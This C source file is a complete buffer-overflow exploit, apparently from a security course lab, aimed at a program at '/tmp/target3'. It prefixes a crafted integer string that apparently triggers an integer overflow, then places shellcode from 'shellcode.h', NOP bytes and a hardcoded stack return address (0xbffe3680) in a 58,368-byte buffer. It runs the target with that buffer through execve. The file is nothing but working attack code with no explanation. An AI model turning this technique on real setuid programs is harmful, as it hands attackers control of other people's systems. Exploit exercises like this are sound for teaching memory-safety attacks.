#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char shcode[sizeof(shellcode)];
  strncpy(shcode, shellcode, sizeof(shcode));

  char *args[3];
  char *env[1];
  char buffer[912 * 64]; 			//58,368
  long * bufptr = (long *) buffer;
  int shaddress = (int)0xbffe3680;

 for(int i = 0; i <14590; i++){
	*(bufptr + i + 3 ) = shaddress;
  }

  
  strncpy(buffer, "4227859344,", 11);
  strncpy(buffer+ 11, shcode, 45); // &shcode = buffer[11]-> but buf[0]
  strncpy(buffer+ 60 , "\x90", 1);
  strncpy(buffer+ 61 , "\x90", 1);
  for(int i = 0; i < 10; i++){
	  strncpy(buffer+ 58327 +(i*4), "\x80\x36\xfe\xbf",4);
  }

  args[0] = TARGET; 
  args[1] = buffer; 
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
